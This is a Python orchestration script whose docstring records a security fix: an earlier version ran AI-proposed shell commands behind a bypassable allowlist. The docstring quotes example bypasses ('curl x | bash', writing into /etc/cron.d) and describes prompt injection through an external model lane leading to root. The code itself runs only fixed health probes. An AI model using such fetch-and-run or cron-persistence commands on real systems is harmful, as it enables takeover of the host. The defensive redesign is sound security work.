#!/usr/bin/env python3
"""earn_loop_ai.py — ROUND-137 REWRITE (CARD 1: KILL THE RCE)

The round-137 DA found a CRITICAL: the old executor ran GLM-proposed shell
commands via subprocess(shell=True) behind a startswith allowlist that was
trivially bypassable (curl x | bash, echo x > /etc/cron.d/y). GLM is an
EXTERNAL lane → prompt injection = arbitrary shell as ubuntu (docker
group) = root on the box.

FIX: the executor runs NO commands from the model at all. The AGI proposes
a task; execution is limited to a CLOSED SET of fixed, hardcoded, safe
probes (health reads only — internal endpoints, no shell, no writes).
The model cannot influence any command string, argument, or path.

Also per round-137: achievements mint only through the verifier chain
(CARD 4: scientists_run.py quote-the-artifact non-earner), never
self-verified. This loop records the outcome; the verifier signs.
"""
import json, pathlib, sys, time, os, subprocess, urllib.request

sys.path.insert(0, "/srv/bricks/orchestrator")
BASE = pathlib.Path("/srv/bricks/orchestrator")

# ---- CLOSED SAFE PROBE SET (the ONLY things this loop can execute) ----
# No model input ever reaches a command. Every probe is hardcoded.

def probe_docker_ps():
    """Count running staging containers. No args from model."""
    try:
        out = subprocess.check_output(
            ["docker", "ps", "--format", "{{.Names}}"], timeout=20,
            stderr=subprocess.DEVNULL).decode().strip().split("\n")
        return len([x for x in out if x]), out[:3]
    except Exception as e:
        return -1, str(e)[:60]

def probe_ram():
    out = subprocess.check_output(["free", "-m"]).decode()
    for l in out.split("\n"):
        if l.startswith("Mem:"):
            return int(l.split()[6])
    return -1

def probe_http(url="http://127.0.0.1:8082"):
    """Internal health check ONLY — fixed URL, no model input."""
    try:
        with urllib.request.urlopen(url, timeout=8) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0

def probe_health():
    return {"containers": probe_docker_ps()[0],
            "ram_mb": probe_ram(),
            "world_http": probe_http()}

def glm(q, max_tokens=700):
    """AGI brainstorm lane (glm-5.2, direct invoke, no fallback).
    The response is parsed for a PROPOSAL ONLY — never executed."""
    tok = open("/srv/bricks/router/tokens/ovh-server-001.token").read().strip()
    body = {"route_receipt": "direct", "lane_id": "glm-5.2",
            "payload": {"model": "z-ai/glm-5.2", "max_tokens": max_tokens,
                        "messages": [{"role": "user", "content": q}]}}
    req = urllib.request.Request("http://127.0.0.1:3742/invoke",
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json", "Authorization": "Bearer " + tok},
        method="POST")
    try:
        with urllib.request.urlopen(req, timeout=100) as r:
            d = json.load(r)
    except Exception:
        return None
    resp = d.get("response", "")
    try:
        return json.loads(resp)["choices"][0]["message"]["content"]
    except Exception:
        return resp[:2000]

def main():
    pre = probe_health()
    print(f"earn-loop: pre-state {pre}")

    # AGI proposes a verification question for the scientist (never a command)
    q = ("You are the AGI. Look at the fleet's current health probe results: "
         f"{json.dumps(pre)}. Propose ONE verification question a scientist "
         "brick should audit right now — e.g. whether a capability improved, "
         "whether a claim is backed by evidence. Reply in 2 sentences, "
         "as a question. No commands, no shell, no code.")
    proposal = glm(q, 300)
    if not proposal:
        print("AGI lane busy — clean skip, no mint")
        return
    print("AGI proposal:", proposal[:200])

    # MEASURE (same closed probes)
    time.sleep(2)
    post = probe_health()
    print(f"earn-loop: post-state {post}")

    # RECORD outcome to the verifier queue — the scientist signs, not us.
    # (Round-137 CARD 4: no self-mint. We write an AUDIT REQUEST; the
    #  registered non-earner verifier quotes evidence and signs.)
    row = {"ts": int(time.time()),
           "type": "verification-request",
           "proposal": proposal[:400],
           "pre": pre, "post": post,
           "delta": {"containers": post["containers"] - pre["containers"],
                     "ram_mb": post["ram_mb"] - pre["ram_mb"]},
           "status": "pending-verifier",
           "self_mint": False}
    req_path = BASE / "verify-queue.jsonl"
    with open(req_path, "a") as f:
        f.write(json.dumps(row) + "\n")
    os.chmod(req_path, 0o600)
    print("verification-request queued for scientist (no self-mint)")

if __name__ == "__main__":
    main()
